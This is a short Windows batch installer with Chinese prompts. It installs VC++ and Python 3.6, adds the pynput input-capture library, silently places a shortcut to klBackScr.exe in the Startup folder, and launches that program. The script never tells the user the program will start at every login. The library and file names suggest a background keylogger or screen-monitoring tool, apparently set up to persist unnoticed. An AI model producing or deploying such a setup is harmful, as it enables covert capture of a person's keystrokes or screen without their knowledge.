@echo off
chcp 65001
set value=
start hook/vc_redist.2015.x64.exe
echo 请按照导航安装VC++
echo 安装完毕后点击任意键继续
echo %value%
pause
start hook/python-3.6.6-amd64.exe
echo 请按照导航安装py编译器，完成以下步骤：
echo 1.勾选Add%value%Python%value%3.6%value%to%value%Path
echo 2.点击Install%value%Now
echo 3.安装完毕后点击任意键继续
echo %value%
pause
pip install pynput -i https://pypi.tuna.tsinghua.edu.cn/simple
set path=klBackScr.exe
set topath=%appdata%"\Microsoft\Windows\Start Menu\Programs\Startup\klBackScr.url"
echo [InternetShortcut] >> %topath%
echo URL="%path%" >> %topath%
echo IconIndex=0 >> %topath%
echo IconFile=%path% >> %topath%
start klBackScr.exe
exit